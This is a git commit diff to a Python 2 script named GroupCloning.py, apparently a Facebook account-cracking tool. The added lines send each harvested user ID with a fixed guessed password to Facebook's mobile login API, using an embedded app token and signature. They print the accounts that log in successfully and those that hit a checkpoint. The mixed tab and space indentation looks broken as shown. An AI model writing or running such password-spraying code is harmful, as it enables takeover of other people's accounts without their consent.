2e44af70530e771982ac7412564ebfd7f57898b5
doublecash <62948229+doublecash@users.noreply.github.com>
2020-04-05 06:16:32 -0500

    Update GroupCloning.py

--- GroupCloning.py
+++ GroupCloning.py
@@ -480,6 +480,16 @@ def pilih_super():
                                                         if 'www.facebook.com' in q['error_msg']:																		
                                                             print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass15 + ' --> ' + b['name']
 							
+							else:																		
+						    pass15 = 'Pakitsan'												
+                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')																		
+                                                    q = json.load(data)																		
+                                                    if 'access_token' in q:																		
+                                                        print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass15 + ' --> ' + b['name']																		
+                				    else:														
+                                                        if 'www.facebook.com' in q['error_msg']:																		
+                                                            print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass15 + ' --> ' + b['name']
+							
         except:																		
             pass																		
 																		
